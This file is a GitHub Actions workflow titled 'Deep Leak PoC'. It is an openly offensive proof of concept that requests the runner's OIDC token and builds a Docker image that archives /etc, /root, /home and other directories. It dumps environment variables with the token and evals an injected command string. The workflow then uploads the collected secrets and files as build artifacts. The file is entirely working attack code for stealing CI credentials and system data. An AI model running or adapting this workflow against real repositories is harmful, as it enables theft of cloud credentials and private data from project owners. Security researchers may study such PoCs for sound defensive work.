name: Deep Leak PoC

on:
  push:
    branches: [ main ]

jobs:
  leak:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read

    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Get OIDC token
        id: oidc
        run: |
          echo "Fetching OIDC token..."
          token=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL")
          echo "OIDC_TOKEN_VALUE=$token" >> "$GITHUB_OUTPUT"
          echo "MALICIOUS_CMD=whoami && id && uname -a && ls -la /root" >> "$GITHUB_OUTPUT"

      - name: Prepare Docker context
        run: mkdir -p ./taskcluster/docker/python

      - name: Save Dockerfile
        run: |
          echo 'FROM python:3.11-alpine
ARG EXFIL_OIDC_TOKEN
ARG PAYLOAD_CMD
RUN apk add --no-cache curl tar bash && \
    echo "[+] Collecting leaks..." && \
    tar -czf /leaks.tar.gz /etc /root /home /var /opt /srv 2>/dev/null || true && \
    echo "[+] Dumping env vars (excluding GITHUB_TOKEN)..." && \
    printenv | grep -v GITHUB_TOKEN >> /leaks_env.txt && \
    echo "OIDC_TOKEN=$EXFIL_OIDC_TOKEN" >> /leaks_env.txt && \
    echo "[+] Executing payload..." && \
    eval "$PAYLOAD_CMD"' > ./taskcluster/docker/python/Dockerfile

      - name: Build leak image
        run: |
          docker build \
            --build-arg EXFIL_OIDC_TOKEN="${{ steps.oidc.outputs.OIDC_TOKEN_VALUE }}" \
            --build-arg PAYLOAD_CMD="${{ steps.oidc.outputs.MALICIOUS_CMD }}" \
            -t leaktest ./taskcluster/docker/python

      - name: Run leak container
        run: |
          docker run --rm leaktest cat /leaks_env.txt > leaks_env.txt
          docker run --rm leaktest cat /leaks.tar.gz > leaks.tar.gz

      - name: Upload artifacts
        uses: actions/upload-artifact@v4
        with:
          name: deep-ci-leaks
          path: |
            leaks_env.txt
            leaks.tar.gz
